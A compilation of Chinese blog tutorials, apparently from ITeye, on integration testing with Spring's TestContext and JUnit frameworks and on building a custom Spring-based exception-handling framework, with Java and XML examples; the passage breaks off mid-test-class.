在 ① 处，标注了一个类级的 @ContextConfiguration 注解，这里 Spring 将按 TestContext 契约查找 classpath:/com/baobaotao/service/TestUserService-context.xml 的 Spring 配置文件，并使用该配置文件启动 Spring 容器。@ContextConfiguration 注解有以下两个常用的属性：
locations：可以通过该属性手工指定 Spring 配置文件所在的位置，可以指定一个或多个 Spring 配置文件。如下所示：
@ContextConfiguration(locations={“xx/yy/beans1.xml”,” xx/yy/beans2.xml”})
inheritLocations：是否要继承父测试用例类中的 Spring 配置文件，默认为 true。如下面的例子：
@ContextConfiguration(locations={"base-context.xml"})
 public class BaseTest {
     // ...
 }
 @ContextConfiguration(locations={"extended-context.xml"})
 public class ExtendedTest extends BaseTest {
     // ...
 }
如果 inheritLocations 设置为 false，则 ExtendedTest 仅会使用 extended-context.xml 配置文件，否则将使用 base-context.xml 和 extended-context.xml 这两个配置文件。
② 处的 @Autowired 注解让 Spring 容器自动注入 UserService 类型的 Bean。而在 ③ 处标注的 @Test 注解则让 handleUserLogin() 方法成为一个 JUnit 4.4 标准的测试方法， @Test 是 JUnit 4.4 所定义的注解。
在运行 TestUserService 测试类之前，让我们先看一下 TestUserService-context.xml 配置文件的内容：
清单 4.TestUserService 所引用的 Spring 配置文件
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xsi:schemaLocation="http://www.springframework.org/schema/beans 
http://www.springframework.org/schema/beans/spring-beans-2.5.xsd">
<!-- ① 引入清单1定义的Spring配置文件 -->
<import resource="classpath:/applicationContext.xml"/>
</beans>
在 ① 处引入了清单 1 中定义的 Spring 配置文件，这样我们就可以将其中定义的 UserService Bean 作为测试固件注入到 TestUserService 中了。
在你的 IDE 中（Eclipse、JBuilder、Idea 等），将 JUnit 4.4 类包引入到项目工程中后，在 TestUserService 类中点击右键运行该测试类，将发现 TestUserService 已经可以成功运行了，如 图 1 所示：
图 1. 在 Eclipse 6.0 中运行 TestUserService
TestUserService 可以正确运行，说明其 userService 这个测试固件已经享受了 Spring 自动注入的功能。在运行该测试用例后，到数据库中查看 t_user 表和 t_login_log 表，你会发现表数据和测试前是一样的！这说明虽然我们在清单 3 的 handleUserLogin() 测试方法中执行了 userService.handleUserLogin(user) 的操作，但它并没有对数据库现场造成破坏：这是因为 Spring 的在测试方法返回前进行了事务回滚操作。
虽然 TestUserService.handleUserLogin() 测试方法已经可以成功运行，但是它在测试功能上是不完善的，读者朋友可以已经发现了它存在以下两个问题：
我们仅仅执行了 UserService#handleUserLogin(user) 方法，但验证该方法执行结果的正确性。
在测试方法中直接使用 ID 为 1 的 User 对象进行测试，这相当于要求在数据库 t_user 表必须已经存在 ID 为 1 的记录，如果 t_user 中不存在这条记录，将导致测试方法执行失败。
回页首
准备测试数据并检测运行结果
在这节里，我们将着手解决上面所提出的两个问题，在测试用例中准备测试数据并到数据库中检测业务执行结果的正确性。
准备测试数据
相比于在测试方法中直接访问预定的数据记录，在测试方法执行前通过程序准备一些测试数据，然后在此基础上运行测试方法是比较好的策略，因为后者不需要对数据库的状态做假设。在 TestContext 中，你可以通过使用 JUnit 4.4 的 @Before 注解达到这个目的，请看下面的代码：
清单5. 为测试方法准备数据
package com.baobaotao.service;
import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.SQLException;
import java.util.Date;
import org.junit.Before;
import org.junit.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.jdbc.core.PreparedStatementCreator;
import org.springframework.jdbc.support.GeneratedKeyHolder;
import org.springframework.jdbc.support.KeyHolder;
import org.springframework.test.context.ContextConfiguration;
import org.springframework.test.context.junit4.
AbstractTransactionalJUnit4SpringContextTests;
import com.baobaotao.dao.UserDao;
import com.baobaotao.domain.User;
@ContextConfiguration
public class TestUserService 
extends AbstractTransactionalJUnit4SpringContextTests {
    @Autowired
    private UserService userService;
   
    @Autowired
    private UserDao userDao;
   
    private int userId;
   
    @Before //① 准备测试数据
    public void prepareTestData() {
        final String  sql = "insert into t_user(user_name,password) values('tom','1234')";
        simpleJdbcTemplate.update(sql);
        KeyHolder keyHolder = new GeneratedKeyHolder();
        simpleJdbcTemplate.getJdbcOperations().update(
            new PreparedStatementCreator() {
                public PreparedStatement createPreparedStatement(Connection conn)
                    throws SQLException {
                    PreparedStatement ps = conn.prepareStatement(sql);
                    return ps;
                }
            }, keyHolder);
        userId = keyHolder.getKey().intValue();//①－1 记录测试数据的id
    }
   
    @Test
    public void handleUserLogin(){
        User user = userDao.getUserById(userId); //② 获取测试数据
        user.setLastIp("127.0.0.1");
        Date now = new Date();
        user.setLastVisit(now.getTime());
        userService.handleUserLogin(user);
    }
}
JUnit 4.4 允许通过注解指定某些方法在测试方法执行前后进行调用，即是 @Before 和 @After 注解。在 Spring TestContext 中，标注 @Before 和 @After 的方法会在测试用例中每个测试方法运行前后执行，并和测试方法运行于同一个事务中。在 清单 5 中 ① 处，我们给 prepareTestData() 标注上了 @Before 注解，在该方法中准备一些测试数据，以供 TestUserService 中所有测试方法使用（这里仅有一个 handleUserLogin() 测试方法）。由于测试方法运行后，整个事务会被回滚，在 prepareTestData() 中插入的测试数据也不会持久化到数据库中，因此我们无须手工删除这条记录。
标注 @Before 或 @After 注解的方法和测试方法运行在同一个事务中，但有时我们希望在测试方法的事务开始之前或完成之后执行某些方法以便获取数据库现场的一些情况。这时，可以使用 Spring TestContext 的 @BeforeTransaction 和 @AfterTransaction 注解来达到目录（这两个注解位于 org.springframework.test.context.transaction 包中）。
虽然大多数业务方法都会访问数据库，但也并非所有需要测试的业务方法都需要和数据库打交道。而在默认情况下，继承于 AbstractTransactionalJUnit4SpringContextTests 测试用例的所有测试方法都将工作于事务环境下，你可以显式地通过 @NotTransactional 注解，让测试方法不工作于事务环境下。
prepareTestData() 方法中使用到了 simpleJdbcTemplate 对象访问操作数据库，该对象在 AbstractTransactionalJUnit4SpringContextTests 抽象类中定义，只要 Spring 容器有配置数据源，simpleJdbcTemplate 就会被自动创建。同时该抽象类中还拥有一个 Spring 容器引用：applicationContext，你可以借助该成员变量访问 Spring 容器，执行获取 Bean，发布事件等操作。
此外，AbstractTransactionalJUnit4SpringContextTests 还提供了若干个访问数据库的便捷方法，说明如下：
protected int countRowsInTable(String tableName) ：计算数据表的记录数。
protected int deleteFromTables(String... names)：删除表中的记录，可以指定多张表。
protected void executeSqlScript(String sqlResourcePath, boolean continueOnError)：执行 SQL 脚本文件，在脚本文件中，其格式必须一个 SQL 语句一行。
在测试方法 handleUserLogin() 的 ② 处，我们通过 userDao 获取 prepareTestData() 添加的测试数据，测试方法在测试数据的基础上执行业务逻辑。使用这种测试方式后，在任何情况下运行 TestUserService 都不会发生业务逻辑之外的问题。
检验业务逻辑的正确性
到目前为此，TestUserService 的 handleUserLogin() 测试方法仅是简单地执行 UserService#handleUserLogin() 业务方法，但并没有在业务方法执行后检查执行结果的正确性，因此这个测试是不到位的。也就是说，我们必须访问数据库以检查业务方法对数据更改是否成功：这包括积分(credits)、最后登录时间(last_visit)、最后登录 IP(last_ip)以及登录日志表中的登录日志记录(t_login_log)。下面，我们补充这项重要的检查数据正确性的工作：
清单5. 检验业务方法执行结果的正确性
@Test
public void handleUserLogin(){
    User user = userDao.getUserById(userId);
    user.setLastIp("127.0.0.1");
    Date now = new Date();
    user.setLastVisit(now.getTime());
    userService.handleUserLogin(user);
    //------------------以下为业务执行结果检查的代码---------------------
    User newUser = userDao.getUserById(userId);
    Assert.assertEquals(5, newUser.getCredits()); //①检测积分
    //①检测最后登录时间和IP
    Assert.assertEquals(now.getTime(), newUser.getLastVisit());
    Assert.assertEquals("127.0.0.1",newUser.getLastIp());
       
    // ③检测登录记录
    String sql = "select count(1) from t_login_log where user_id=? "+
        “ and login_datetime=? and ip=?";
    int logCount =simpleJdbcTemplate.queryForInt(sql, user.getUserId(),
        user.getLastVisit(),user.getLastIp());
    Assert.assertEquals(1, logCount); 
   }
在业务方法执行后，我们查询数据库中相应记录以检查是否和期望的效果一致，如 ① 和 ② 所示。在 ③ 处，我们使用 SimpleJdbcTemplate 查询 t_login_log，以检查该表中是否已经添加了一条用户登录日志。
注意：由于我们的 DAO 层采用 Spring JDBC 框架，它没有采用服务层缓存技术，所以可以使用 DAO 类返回数据库中的数据。如果采用 Hibernate 等 ORM 框架，由于它们采用了服务层缓存的技术，为了获取数据库中的相应数据，需要在业务方法执行后调用 HibernateTemplate.flush() 方法，将缓存中的对象同步到数据库中，这时才可以通过 SimpleJdbcTemplate 在数据库中访问业务方法的执行情况。
回页首
Spring TestContext 测试框架体系结构
在前面，我们直接通过扩展 AbstractTransactionalJUnit4SpringContextTests 编写测试用例，在了解了编写基于 TestContext 测试框架的测试用例后，现在是了解 TestContext 测试框架本身的时候了。
TestContext 核心类、支持类以及注解类
TestContext 测试框架的核心由 org.springframework.test.context 包中三个类组成，分别是 TestContext 和 TestContextManager 类以及 TestExecutionListener 接口。其类图如下 图 2 所示：
图 2. Spring TestContext 测试框架核心类
TestContext：它封装了运行测试用例的上下文；
TestContextManager：它是进入 Spring TestContext 框架的程序主入口，它管理着一个 TestContext 实例，并在适合的执行点上向所有注册在 TestContextManager 中的 TestExecutionListener 监听器发布事件：比如测试用例实例的准备，测试方法执行前后方法的调用等。
TestExecutionListener：该接口负责响应 TestContextManager 发布的事件。
Spring TestContext 允许在测试用例类中通过 @TestExecutionListeners 注解向 TestContextManager 注册多个监听器，如下所示：
@TestExecutionListeners( { 
    DependencyInjectionTestExecutionListener.class,
    DirtiesContextTestExecutionListener.class })
public class TestXxxService{
    …
}
Spring 提供了几个 TestExecutionListener 接口实现类，分别说明如下：
DependencyInjectionTestExecutionListener：该监听器提供了自动注入的功能，它负责解析测试用例中 @Autowried 注解并完成自动注入；
DirtiesContextTestExecutionListener：一般情况下测试方法并不会对 Spring 容器上下文造成破坏（改变 Bean 的配置信息等），如果某个测试方法确实会破坏 Spring 容器上下文，你可以显式地为该测试方法添加 @DirtiesContext 注解，以便 Spring TestContext 在测试该方法后刷新 Spring 容器的上下文，而 DirtiesContextTestExecutionListener 监听器的工作就是解析 @DirtiesContext 注解；
TransactionalTestExecutionListener：它负责解析 @Transaction、@NotTransactional 以及 @Rollback 等事务注解的注解。@Transaction 注解让测试方法工作于事务环境中，不过在测试方法返回前事务会被回滚。你可以使用 @Rollback(false) 让测试方法返回前提交事务。而 @NotTransactional 注解则让测试方法不工作于事务环境中。此外，你还可以使用类或方法级别的 @TransactionConfiguration 注解改变事务管理策略，如下所示：
@TransactionConfiguration(transactionManager="txMgr", defaultRollback=false)
@Transactional
public class TestUserService {
    …
}
我们知道在 JUnit 4.4 中可以通过 @RunWith 注解指定测试用例的运行器，Spring TestContext 框架提供了扩展于 org.junit.internal.runners.JUnit4ClassRunner 的 SpringJUnit4ClassRunner 运行器，它负责总装 Spring TestContext 测试框架并将其统一到 JUnit 4.4 框架中。
TestContext 所提供的抽象测试用例
Spring TestContext 为基于 JUnit 4.4 测试框架提供了两个抽象测试用例类，分别是 AbstractJUnit4SpringContextTests 和 AbstractTransactionalJUnit4SpringContextTests，而后者扩展于前者。让我们来看一下这两个抽象测试用例类的骨架代码：
@RunWith(SpringJUnit4ClassRunner.class) //① 指定测试用例运行器
@TestExecutionListeners(                 //② 注册了两个TestExecutionListener监听器
    { DependencyInjectionTestExecutionListener.class,
    DirtiesContextTestExecutionListener.class })
public class AbstractJUnit4SpringContextTests implements ApplicationContextAware {
    …
}
① 处将 SpringJUnit4ClassRunner 指定为测试用例运行器，它负责无缝地将 TestContext 测试框架移花接木到 JUnit 4.4 测试框架中，它是 Spring TestContext 可以运行起来的根本所在。② 处通过 @TestExecutionListeners 注解向测试用例类中注册了两个 TestExecutionListener 监听器，这两个监听器分别负责对 @Autowired 和 @DirtiesContext 注解进行处理，为测试用例提供自动注入和重新刷新 Spring 容器上下文的功能。
AbstractTransactionalJUnit4SpringContextTests 扩展于 AbstractJUnit4SpringContextTests，提供了事务管理的支持，其骨架代码如下所示：
//① 注册测试用例事务管理的监听器
@TestExecutionListeners( { TransactionalTestExecutionListener.class })
@Transactional    //② 使测试用例的所有方法都将工作于事务环境下
public class AbstractTransactionalJUnit4SpringContextTests 
extends AbstractJUnit4SpringContextTests {
    …
}
在 ① 处，AbstractTransactionalJUnit4SpringContextTests 向测试用例类中注册了 TransactionalTestExecutionListener 监听器，这样测试用例中的 @Transaction、@NotTransaction 以及 @Rollback 等注解就可以正确地工作起来了。注意，你不需要在 Spring 配置文件通过 <tx:annotation-driven /> 和 <context:annotation-config/> 为测试用例类启用注解事务驱动和注解自动注入，这个工作完全于 TestContext 自身来解决（通过注册 DependencyInjectionTestExecutionListener 和 TransactionalTestExecutionListener 监听器），毕竟测试用例类没有注册到 Spring 容器中，没有成为 Spring 的 Bean。
小结
我们通过对一个典型的涉及数据库访问操作的 UserService 服务类的测试，讲述了使用 Spring 2.5 TestContext 测试框架进行集成测试的各项问题，这包括测试固件的自动注入、事务自动回滚、通过 SimpleJdbcTemplate 直接访问数据库以及测试数据准备等问题。
在通过一个实际例子的学习后，我们对如何使用 TestContext 测试框架有了一个具体的认识，在此基础上我们对 Spring TestContext 测试框架体系结构进行了分析，然后剖析了 Spring 为 TestContext 嫁接到 JUnit 4.4 测试框架上所提供的两个抽象测试用例类。
Spring 的 TestContext 测试框架不但可以整合到 JUnit 4.4 测试框架上，而且还可以整合到 JUnit 3.8 以及 TestNG 等测试框架上。目前已经提供了对 JUnit 3.8 以及 TestNG 的支持，你可以分别在 org.springframework.test.context.junit38 和 org.springframework.test.context.testng 包下找到整合的帮助类。
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Spring整合JUnit框架进行单元测试代码使用详解, lizhuangs.iteye.com.blog.2063562, Thu, 08 May 2014 10:21:29 +0800

原创整理不易，转载请注明出处：Spring整合JUnit框架进行单元测试代码使用详解
代码下载地址：http://www.zuidaima.com/share/1775457756285952.htm
一、Spring提供的JUnit框架扩展：    1. AbstractSpringContextTests：spring中使用spring上下文测试的Junit扩展类，我们一般不会使用这个类来进行单元测试，它是spring内部设计使用到的类    2. AbstractDependencyInjectionSpringContextTests：这是AbstractSpringContextTests的直接子类，支持依赖spring上下文的测试类，这个类不支持事务。    3. AbstractTransactionalSpringContextTests：这是 AbstractDependencyInjectionSpringContextTests的直接子类，这个类一般应用在事务相关的测试中，一旦完成每个测试它就会正常地回滚事务，不会真正更新数据库，若要手动设置事务相关操作，你可以重载onSetUpInTransaction和 onTearDownInTransaction方法，以便手工开始并提交事务，或者调用setComplete()方法。这个类也可以在没有事务的情况下，使用这个类。    4. AbstractTransactionalDataSourceSpringContextTests：这是 AbstractTransactionalSpringContextTests的直接子类，它使用了Spring的基于JDBC的 jdbcTemplate工具类，支持数据库级别的事务。 二、如何在你的TestCase Class里取得spring context      你的TestCase Class必须继承的是上述四个AbstractXXXSpringContextTests中的其中一个，那么就必须实现下面这个方法来取得spring context：       protected abstract String[] getConfigLocations();       例如：
      public String[] getConfigLocations() {
           String[] configLocations = { "applicationContext.xml","hibernate-context.xml" };
           return configLocations;
       }
 请 注意要加载的context xml file的路径问题：上述的代码是基于classpath，因此applicationContext.xml和hibernate- context.xml必须放在classpath里（方法一是把xml files放到WEB-INF/classes目录下，另一种方法就是在project properties里把xml files的路径加到classpath里） 那么如果你一定要把context xml files放到WEB-INF目录下，也是可以的，那么应该基于file(基于file的相对路径是相对于project root folder)，代码如下：  
 public String[] getConfigLocations() {
    String[] configLocations = { "file:WebContent/WEB-INF/applicationContext.xml"};
    return configLocations;
 }
AbstractXXXSpringContextTests就会根据根据getConfigLocations方法返回的context xml位置的数组来加载并且对加载的Context提供缓存。这是非常重要的，因为如果你在从事一个大项目时，启动时间可能成为一个问题－－这不是 Spring自身的开销，而是被Spring容器实例化的对象在实例 化自身时所需要的时间。例如，一个包括50-100个Hibernate映射文件的项目可能需要10-20秒的时间来加载上述的映射文件，如果在运行每个测试fixture里的每个测试案例前都有这样的开销，将导致整个测试工作的延时，最终有可能（实际上很可能）降低效率。 在某种极偶然的情况下，某个测试可能“弄脏”了配置场所，并要求重新加载－－例如改变一个bean的定义或者一个应用对象的状态－－你可以调用 AbstractDependencyInjectionSpringContextTests 上的 setDirty() 方法来重新加载配置并在执行下一个测试案例前重建application context 当类 AbstractDependencyInjectionSpringContextTests（及其子类）装载你的Application Context时，你可以通过Setter方法来注入你想要的来自context的bean,而不需要显式的调用 applicationContext.getBean(XXX)。因为 AbstractDependencyInjectionSpringContextTests会从getConfigLocations()方法指定的配置文件中帮你自动注入 下面的例子就是通过setter方法来获得context里的ProductManager bean：
public class MyTest extends AbstractDependencyInjectionSpringContextTests {
    ProductManager productManager;
    public String[] getConfigLocations() {
        String[] configLocations = { "file:WebContent/WEB-INF/applicationContext.xml" };
        return configLocations;
    }
    public void testGetProduct() {
       assertEquals("tomson",productManager.getProductByName("tomson").getName());
    }
   
    //通过setter方法自动从context里注入productManager bean，而不用显示调用applicationContext.getBean(XXX)
    public void setProductManager(ProductManager productManager) {
       this.productManager = productManager;
    }
}
但是如 果context里有多个bean都定义为一个类型（例如有多个bean都是ProductManager class类型的），那么对这些bean就无法通过setter方法来自动依赖注入（因为有多个bean同一个类型，不知要自动注入哪个）。在这种情况下 你需要显示的调用applicationContext.getBean(XXX)来注入。如：  
public class MyTest extends AbstractDependencyInjectionSpringContextTests {
   ProductManager productManager;
   public String[] getConfigLocations() {
      String[] configLocations = { "file:WebContent/WEB-INF/applicationContext.xml" };
      return configLocations;
   }
   public void onSetUp() {
       productManager = (ProductManager) applicationContext.getBean("productManager");
   }
   public void testGetProduct() {
       assertEquals("tomson",productManager.getProductByName("tomson").getName());
   }
 
}
如果你的TestCase不使用依赖注入，只要不定义任何setters方法即可。或者你可以继承 AbstractSpringContextTests －－这个 org.springframework.test 包中的根类，而不是继承AbstractDependencyInjectionSpringContextTests（及其子类）。这是因为 AbstractSpringContextTests 只包括用来加载Spring Context的便利方法但没有自动依赖注入的功能。
已有 1 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
在java Spring基础上实现自定义异常处理框架教程, lizhuangs.iteye.com.blog.2061917, Tue, 06 May 2014 09:42:26 +0800

原创整理不易，转载请注明出处：在java Spring基础上实现自定义异常处理框架教程
代码下载地址：http://www.zuidaima.com/share/1774096228535296.htm
应用项目大致的体系结构：
      
 该异常处理框架满足的要求：
 
完整的异常组织结构
异常的统一处理
可配置，受管式，方便使用
 
完整的异常组织结构：
用户可以方便的定义自己的异常，但所有UncheckedException需要继承BaseAppRuntimeException，所有的checked Exception可以继承BaseAppException，或者需要抛出且不需要check时用WrapperredAppException封装后抛出
合理地使用checked异常
Exception有唯一的error code，这样用户报告异常后，可以根据异常号找到相应Exception，把exception直接显示给用户也没有太大的意义，如何纪录exception那就是下文讲到的ExceptionHandler的职责了。
如果是第三方包括jdk中的异常，需要封装成BaseAppException或者BaseAppRuntimeException后抛出
                                      
   
 
统一的异常处理
异常统一在框架中进行处理，不需要在上层应用的代码中去处理抛出的异常。为了尽量捕捉到所有的异常，将异常处理放在了ActionBroker中，这样凡是action以后抛出的异常都可以捕捉到，因为webservice只是简单的调用action类的方法，一般不会出现异常。当我们捕捉到异常后，需要进行异常处理，定义了ExceptionHandler接口，用接口抽象出异常处理类的具体实现。
 
                          
USFContextFactory: 创建ExceptionContext的工厂
package com.ldd0.exception.context;
public class CoreContextFactory {
    private static CoreContextFactory instance;
    private volatile ExceptionContext exceptionContext;
    private Object exceptionContextLock = new Object();
    private CoreContextFactory() {
    }
    public static synchronized CoreContextFactory getInstance() {
        if (null == instance) {
            instance = new CoreContextFactory();
        }
        return instance;
    }
    public ExceptionContext getExceptionContext() {
        ExceptionContext tempExpContext = exceptionContext;
        if (tempExpContext == null) { 
            synchronized (exceptionContextLock) {
                tempExpContext = exceptionContext;
                if (tempExpContext == null)
                    exceptionContext = tempExpContext = new ExceptionContext();
            }
        }
        return tempExpContext;
    }
}
ExceptionContext: 存放全局的exception信息
package com.ldd600.exception.context;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Collections;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Set;
import org.springframework.util.Assert;
import com.ldd600.exception.base.BaseAppRuntimeException;
import com.ldd600.exception.base.ConfigException;
import com.ldd600.exception.base.handler.ExceptionHandler;
import com.ldd600.exception.config.ExceptionDefinition;
public class ExceptionContext {
    private Map<Class<?>, ExceptionDefinition> exceptionMap;
    private Map<String, ExceptionHandler> handlers = new HashMap<String, ExceptionHandler>();
    ExceptionContext() {
        exceptionMap = new HashMap<Class<?>, ExceptionDefinition>();
    }
    public boolean containsException(Class<?> expClazz) {
        return (exceptionMap.containsKey(expClazz));
    }
    
    public void addExceptionHander(Class<?> expClazz, Class<? extends ExceptionHandler> handlerClazz) {
        try {
            ExceptionDefinition definition = getRealExceptionDefinition(expClazz);
            if (null == definition) {
                throw new IllegalArgumentException(expClazz.getName() + "not in the context, please configure or add it to the context first!!");
            } 
            ExceptionHandler handler = handlers.get(handlerClazz.getName());
            if (null == handler) {
                handler = handlerClazz.newInstance();
                handlers.put(handlerClazz.getName(), handler);
            }
            
            definition.getHandlerNames().add(handlerClazz.getName());
        } catch (Exception ex) {
            throw new ConfigException("Add exception handler to context failure!", ex);
        }
    }
    
    public void addExceptionHandler(Class<?> expClazz, String errorCode, Class<? extends ExceptionHandler> handlerClazz) {
        Assert.hasLength(errorCode, expClazz + " errorCode must not be null or empty string!");
        ExceptionDefinition definition = getRealExceptionDefinition(expClazz);
        if(null == definition) {
            definition = new ExceptionDefinition(errorCode);
            exceptionMap.put(expClazz, definition);
        }
        addExceptionHander(expClazz, handlerClazz);
    }
    
    
    
    public void addExceptionHandlers(Class<?> expClazz, Class<? extends ExceptionHandler> handlerClazzes) {
        for(Class<? extends ExceptionHandler> handlerClazz : handlerClazzes) {
            addExceptionHander(expClazz, handlerClazz);
        }
    }
    public void removeExceptionHandler(Class<?> expClazz, Class<? extends ExceptionHandler> handlerClazz) {
        Assert.isTrue(containsException(expClazz));
        String handlerName = handlerClazz.getName();
        getExceptionDefinition(expClazz).getHandlerNames().remove(handlerName);
        Collection<ExceptionDefinition> definitons = exceptionMap.values();
        boolean isClearHandler = true;
        for (ExceptionDefinition expDefinition : definitons) {
            if (expDefinition.getHandlerNames().contains(handlerName)) {
                isClearHandler = false;
                break;
            }
        }
        if (isClearHandler) {
            handlers.remove(handlers.get(handlerName));
        }
    }
    public void setExceptionDefinition(Class<?> expClazz, ExceptionDefinition definition) {
        exceptionMap.put(expClazz, definition);
    }
    public ExceptionDefinition getExceptionDefinition(Class<?> expClazz) {
        if (containsException(expClazz)) {
            return exceptionMap.get(expClazz);  
        } else if (BaseAppRuntimeException.class.isAssignableFrom(expClazz.getSuperclass())) {
            return getExceptionDefinition(expClazz.getSuperclass());
        } else {
            return null;
        }
    }
    
    public ExceptionDefinition getRealExceptionDefinition(Class<?> expClazz) {
        return exceptionMap.get(expClazz);
    }
    public List<ExceptionHandler> getExceptionHandlers(Class<?> expClazz){
        ExceptionDefinition definition = getExceptionDefinition(expClazz);
        if (null != definition) {
            Set<String> handlerNames = definition.getHandlerNames();
            List<ExceptionHandler> handlerList = new ArrayList<ExceptionHandler>(handlerNames.size());
            for (String handlerName : handlerNames) {
                ExceptionHandler handler = handlers.get(handlerName);
                handlerList.add(handler);
            }
            List<ExceptionHandler> resultHandlerList = new ArrayList<ExceptionHandler>(handlerList);
            return resultHandlerList;
        } else {
            return Collections.<ExceptionHandler> emptyList();
        }
    }
    
    public String getErrorCode(Class<?> expClazz){
        ExceptionDefinition definition = getExceptionDefinition(expClazz);
        if (null != definition) {
            return definition.getErrorCode();
        } else {
            return "";
        }
    }
    
    
}
 
ExceptionDefinition: Exception信息单元
 
package com.ldd0.exception.config;
import java.util.LinkedHashSet;
import java.util.Set;
public class ExceptionDefinition {
    private String errorCode;
    private Set<String> handlerNames = new LinkedHashSet<String> ();
    ExceptionDefinition() {
        
    }
    
    public ExceptionDefinition(String errorCode) {
        this.errorCode = errorCode;
    }
    
    public String getErrorCode() {
        return errorCode;
    }
    public void setErrorCode(String errorCode) {
        this.errorCode = errorCode;
    }
    public Set<String> getHandlerNames() {
        return handlerNames;
    }
}
 
ExceptionDefiniton定义了和某个exception相关的具体信息，根据exception的class name可以从exceptionContext中的exceptionMap得到指定的exception的相关信息，这些信息是在系统初始化时读取到exceptionContext中的。并且避免了exception handler的重复初始化。
 
可配置，受管式，方便使用
 采取两种配置方式，exception的相关信息比如它的errorCode， exceptionHandlers可以配置在外部的xml文件中，也可以用annotation标注。对于exception的处理是有继承性质的，如果某个exception没有在exceptionContext中注册，就使用它的父类的配置信息。如果无任何父类在exceptionContext中注册，就使用默认机制进行处理。
 
XML 方案：
            因为spring2.0支持自定义schema功能，我们可以方便地采用自己的schema只要实现NamespaceHandler和BeanDefinitionPaser，后面一个比较重要，可以将自定义xml文件中的相关类注册到spring的上下文中，成为spring bean。
Xml schema:
<xsd:complexType name="exceptionType">
        <xsd:sequence>
            <xsd:element name="level" default="error" minOccurs="0">
                <xsd:simpleType>
                    <xsd:restriction base="xsd:string">
                        <xsd:enumeration value="error" />
                        <xsd:enumeration value="warning" />
                        <xsd:enumeration value="info" />
                        <xsd:enumeration value="confirmation" />
                    </xsd:restriction>
                </xsd:simpleType>
            </xsd:element>
            <xsd:element name="handler" maxOccurs="unbounded">
                <xsd:simpleType>
                    <xsd:restriction base="xsd:string" />
                </xsd:simpleType>
            </xsd:element>
        </xsd:sequence>
        <xsd:attribute name="errorCode">
            <xsd:simpleType>
                <xsd:restriction base="xsd:string">
                    <xsd:whiteSpace value="preserve" />
                    <xsd:pattern value="LDD600-+\d{1,5}.*" />
                </xsd:restriction>
            </xsd:simpleType>
        </xsd:attribute>
        <xsd:attribute name="class" type="xsd:string" use="required" />
    </xsd:complexType>
 
Annotation方案：
            JDK1.5以上就有了annotation，可以简化我们的配置，使得配置信息和代码联系在一起，增加了代码的可读性。如何在spring中注册自定义的annotation和用annotation标注的class，可以参考文章2和文章：   。对于每个注册了的class用ExceptionalAnnotationBeanPostProcessor来parse具体的annotation信息（对于annotation的parse方法还会在以后继续改进）。
package com.ldd600.exception.processor;
import org.springframework.beans.BeansException;
import org.springframework.beans.factory.config.BeanPostProcessor;
import com.ldd600.exception.annotation.Exceptional;
import com.ldd600.exception.base.BaseAppException;
import com.ldd600.exception.base.BaseAppRuntimeException;
import com.ldd600.exception.config.ExceptionDefinition;
import com.ldd600.exception.context.ExceptionContext;
import com.ldd600.exception.context.CoreContextFactory;
public class ExceptionalAnnotationBeanPostProcessor implements BeanPostProcessor {
    public Object postProcessAfterInitialization(Object bean, String beanName) throws BeansException {
       if(bean instanceof BaseAppRuntimeException || bean instanceof BaseAppException) {
           Exceptional exceptional = bean.getClass().getAnnotation(Exceptional.class);
           if(null != exceptional) {
               ExceptionContext ctx = CoreContextFactory.getInstance().getExceptionContext();
               if(!ctx.containsException(bean.getClass())) {
                   ExceptionDefinition expDefinition = new ExceptionDefinition(exceptional.errorCode());
                   ctx.setExceptionDefinition(bean.getClass(), expDefinition);
               }
               ctx.addExceptionHandlers(bean.getClass(), exceptional.handlers());
               return null;
           }
       }
       return bean;
    }
    public Object postProcessBeforeInitialization(Object bean, String beanName) throws BeansException {
            return bean;
    }
}
 
结果测试：
package com.ldd600.exception.test;
import org.jmock.Expectations;
import org.jmock.Mockery;
import org.springframework.beans.factory.BeanFactory;
import com.ldd600.exception.action.BusinessAction;
import com.ldd600.exception.base.BaseAppException;
import com.ldd600.exception.base.BaseAppRuntimeException;
import com.ldd600.exception.base.ConfigException;
import com.ldd600.exception.base.handler.ConsoleHandler;
import com.ldd600.exception.context.CoreContextFactory;
import com.ldd600.exception.dto.DefaultRequest;
import com.ldd600.exception.dto.DefaultResponse;
import com.ldd600.exception.dto.Request;
import com.ldd600.exception.dto.Response;
import com.ldd600.exception.webservice.ActionBrokerImpl;
public class ExceptionTest extends DependencyInjectionExceptionTestCase {
    Mockery context = new Mockery();
    ActionBrokerImpl broker = new ActionBrokerImpl();
    final Request request = new DefaultRequest();
    final Response response = new DefaultResponse();
    @Override
    protected String[] getConfigLocations() {
        return new String[] { "applicationContext.xml" };
    }
    public void testExceptionThrow() {
        final BusinessAction<Response, Request> action = context
                .mock(BusinessAction.class);
        final BeanFactory beanFactory = context.mock(BeanFactory.class);
        assertThrowing(new Closure() {
            public void run() throws Throwable {
                context.checking(new Expectations() {
                    {
                        allowing(beanFactory).getBean("action");
                        will(returnValue(action));
                        one(action).execute(request, response);
                        will(throwException(new BaseAppException()));
                    }
                });
                broker.setExceptionHandler(new ConsoleHandler());
                broker.setBeanFactory(beanFactory);
                broker.execute("action", request, response);
            }
        }, BaseAppException.class);
    }
    public void testExceptionalAutoLoad() throws BaseAppException {
        final BeanFactory beanFactory = context.mock(BeanFactory.class);
        final BusinessAction<Response, Request> action = context
                .mock(BusinessAction.class);
        context.checking(new Expectations() {
            {
                allowing(beanFactory).getBean("action");
                will(returnValue(action));
                one(action).execute(request, response);
                will(throwException(new ConfigException()));
            }
        });
        broker.setBeanFactory(beanFactory);
        broker.execute("action", request, response);
        assertEquals(CoreContextFactory.getInstance().getExceptionContext()
                .getErrorCode(ConfigException.class), "LDD600-00002");
        context.assertIsSatisfied();
    }
    public void testRuntimeException() {
        final BusinessAction<Response, Request> action = context
                .mock(BusinessAction.class);
        final BeanFactory beanFactory = context.mock(BeanFactory.class);
        assertThrowing(new Closure() {
            public void run() throws Throwable {
                context.checking(new Expectations() {
                    {
